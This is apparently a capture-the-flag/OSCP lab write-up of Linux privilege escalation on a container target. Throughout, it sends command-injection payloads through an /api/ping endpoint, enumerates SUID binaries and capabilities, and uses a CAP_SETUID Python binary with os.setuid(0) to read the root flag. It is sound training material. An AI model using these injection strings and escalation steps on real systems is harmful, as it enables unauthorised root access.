---
type: machine-phase
project: OSCP-Exam-PoC
machine: ME-01
difficulty: Medium
phase: privilege-escalation
status: completed
platform: Linux
initial_user: svc
privilege_escalation: CAP_SETUID
tags:
  - oscp
  - privilege-escalation
  - linux-capabilities
  - cap-setuid
  - python
root_flag_submitted: true
---

# ME-01 — Root Privilege Escalation

> **Flag completion:** Root flag obtained and submitted (confirmed by the examination participant). Public value: `IT{FLAG-SECRET}`.

## 1. Phase overview

|Property|Value|
|---|---|
|Starting identity|`svc`|
|Starting UID/GID|`1000:1000`|
|Working directory|`/opt/svcapp`|
|Target|`/root/root.txt`|
|Escalation mechanism|Linux file capability: `CAP_SETUID`|
|Vulnerable executable|`/usr/local/bin/pyadmin`|
|Final identity|`root` (UID 0)|
|Result|Root flag retrieved and submitted|

The initial foothold and authenticated command injection are documented in [[Difficulty Levels/Medium/ME-01/user]].

The objective of this phase was to escalate from `svc` to root and retrieve `/root/root.txt`.

## 2. Enumerate the execution environment

The first command collected the hostname, kernel, distribution, working directory, and filesystem layout:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; hostname; uname -a; cat /etc/os-release; pwd; ls -lah /' \
  "$BASE/api/ping"
```

Relevant output:

```
medium
Linux medium 6.8.0-147-generic #147-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep 24 11:33:16 UTC 2026 x86_64 GNU/Linux

PRETTY_NAME="Debian GNU/Linux 13 (trixie)"
NAME="Debian GNU/Linux"
VERSION_ID="13"
VERSION="13 (trixie)"
VERSION_CODENAME=trixie
DEBIAN_VERSION_FULL=13.7

/opt/svcapp
```

The root directory listing included:

```
-rwxr-xr-x   1 root root    0 Nov  4 18:11 .dockerenv
```

**Interpretation:** The `.dockerenv` file is a strong indicator that the application is running inside a Docker container. The kernel identifies itself as an Ubuntu kernel, while the container userspace is Debian 13.

This distinction matters: obtaining UID 0 inside this environment does not, by itself, demonstrate escape to the underlying host.

## 3. Enumerate SUID binaries

The next check searched the filesystem for SUID executables:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; find / -type f -perm -4000 -ls 2>/dev/null' \
  "$BASE/api/ping"
```

Relevant output:

```
2622215     72 -rwsr-xr-x   1 root root  72072 Jul 31 15:34 /usr/bin/mount
2622220     20 -rwsr-xr-x   1 root root  18816 Jul 31 15:34 /usr/bin/newgrp
2622108     52 -rwsr-xr-x   1 root root  52936 Apr 19  2025 /usr/bin/chsh
2622307     56 -rwsr-xr-x   1 root root  55688 Jul 31 15:34 /usr/bin/umount
2622283     84 -rwsr-xr-x   1 root root  84360 Jul 31 15:34 /usr/bin/su
2622102     72 -rwsr-xr-x   1 root root  70888 Apr 19  2025 /usr/bin/chfn
2622231    116 -rwsr-xr-x   1 root root 118168 Apr 19  2025 /usr/bin/passwd
2622166     88 -rwsr-xr-x   1 root root  88568 Aug 10  2024 /usr/bin/gpasswd
```

No unusual SUID executable was identified in this enumeration.

## 4. Enumerate Linux capabilities

SUID enumeration did not reveal the escalation path, so the next check searched for file capabilities:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; getcap -r / 2>/dev/null' \
  "$BASE/api/ping"
```

Output:

```
/usr/local/bin/pyadmin cap_setuid=ep
```

This was the critical finding.

### Understanding `CAP_SETUID=ep`

Linux capabilities divide traditional root privileges into individual permissions.

`CAP_SETUID` allows a process to manipulate user IDs, including changing its UID to `0` when the relevant kernel permission checks are satisfied.

The capability suffix means:

|Flag|Meaning|
|---|---|
|`e`|Effective — the capability is active for the executable's process|
|`p`|Permitted — the capability is available to the process|

The executable therefore has a capability that can allow it to change its process identity without requiring the SUID permission bit.

This is a file capability, not a SUID configuration.

## 5. Check sudo availability

As another standard privilege-escalation check, the following was executed:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; sudo -n -l 2>&1' \
  "$BASE/api/ping"
```

Output:

```
/bin/sh: 1: sudo: not found
```

Sudo was not installed in the container. The capability finding remained the actionable lead.

## 6. Inspect `pyadmin`

The executable was inspected before attempting escalation:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; file /usr/local/bin/pyadmin; ls -l /usr/local/bin/pyadmin; readlink -f /usr/local/bin/pyadmin; /usr/local/bin/pyadmin --version 2>&1' \
  "$BASE/api/ping"
```

Output:

```
/bin/sh: 1: file: not found
-rwxr-xr-x 1 root root 14472 Nov  3 11:50 /usr/local/bin/pyadmin
/usr/local/bin/pyadmin
Python 3.11.18
```

Observations:

- `file` was unavailable inside the container.
    
- `pyadmin` was owned by root.
    
- Its permissions were `755`; the SUID bit was not set.
    
- The path resolved directly to `/usr/local/bin/pyadmin`.
    
- Its version output identified it as a Python 3.11.18 interpreter.
    

The combination of Python execution and `CAP_SETUID` suggested a direct way to exercise the capability through Python's `os.setuid()`.

## 7. Test privilege escalation

Python exposes the required system calls through its `os` module.

The test was executed through the vulnerable `/api/ping` command-injection endpoint:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; /usr/local/bin/pyadmin -c "import os; print(os.getuid(), os.geteuid()); os.setuid(0); print(os.getuid(), os.geteuid())"' \
  "$BASE/api/ping"
```

Output:

```
1000 1000
0 0
```

### What happened?

The Python code was:

```
import os

print(os.getuid(), os.geteuid())

os.setuid(0)

print(os.getuid(), os.geteuid())
```

|Function|Purpose|
|---|---|
|`os.getuid()`|Returns the real UID|
|`os.geteuid()`|Returns the effective UID|
|`os.setuid(0)`|Requests a transition to UID 0|

The output establishes the transition:

|Stage|Real UID|Effective UID|
|---|---|---|
|Before `os.setuid(0)`|1000|1000|
|After `os.setuid(0)`|0|0|

<mark>Privilege escalation confirmed.</mark>

The `CAP_SETUID` capability allowed the Python process to change its identity to root.

## 8. Retrieve the root flag

With the UID transition confirmed, the next step was to read the root flag directly through the privileged Python process:

```
curl -i --get \
  -H "X-API-Key: $API_KEY" \
  --data-urlencode 'host=127.0.0.1; /usr/local/bin/pyadmin -c "import os; os.setuid(0); print(open(\"/root/root.txt\").read())"' \
  "$BASE/api/ping"
```

The resulting root flag was:

```
IT{FLAG-SECRET}
```

**Submission status:** Successfully submitted.

## 9. Final privilege-escalation chain

```
Authenticated command injection as svc
                |
                v
Enumerate SUID binaries
                |
                v
No unusual SUID finding
                |
                v
Enumerate file capabilities
                |
                v
/usr/local/bin/pyadmin cap_setuid=ep
                |
                v
Execute Python through pyadmin
                |
                v
os.setuid(0)
                |
                v
Real UID = 0
Effective UID = 0
                |
                v
Read /root/root.txt
                |
                v
Root flag submitted
```

### Confirmed versus unconfirmed scope

The evidence confirms root-level execution inside the target's application environment.

The `.dockerenv` indicator suggests a containerized environment, but no container escape was performed or demonstrated. Do not classify this result as host-root access.

## 10. Lessons and reusable checks

### Enumeration checklist

Do not restrict Linux privilege-escalation enumeration to SUID binaries and sudo permissions.

At minimum, check:

```
id
sudo -n -l 2>&1
find / -type f -perm -4000 -ls 2>/dev/null
getcap -r / 2>/dev/null
```

### Technical lessons

1. **Check Linux capabilities.** An executable with `CAP_SETUID` can be a direct privilege-escalation path.
    
2. **Inspect the actual executable.** Do not assume a binary is SUID simply because it is root-owned.
    
3. **Understand the capability suffix.** `=ep` identifies effective and permitted capability sets.
    
4. **Verify the UID transition.** Printing `getuid()` and `geteuid()` before and after `setuid(0)` provided direct evidence.
    
5. **Distinguish container root from host root.** UID 0 in a container does not automatically imply control of the host.
    
6. **Use the execution path you already have.** A reliable command-injection channel was sufficient; a reverse shell was unnecessary for retrieving the flag.
    

## 11. Evidence registry

|Evidence|What it establishes|
|---|---|
|Environment enumeration|Debian 13 userspace, working directory, `.dockerenv`, kernel|
|SUID enumeration|Standard SUID binaries; no unusual finding|
|`getcap` output|`CAP_SETUID=ep` on `pyadmin`|
|`sudo -n -l` output|Sudo unavailable|
|`pyadmin` inspection|Root ownership, mode `755`, Python 3.11.18|
|UID transition output|Successful transition from UID 1000 to UID 0|
|Root flag output|Access to `/root/root.txt`|
|User confirmation|Root flag submitted successfully|

---

## Related notes

- [[ME-01 Overview]]
    
- [[Difficulty Levels/Medium/ME-01/user]]
    
- [[Exam Context/Exam Timeline|Exam Timeline]]
    
- [[Dashboard]]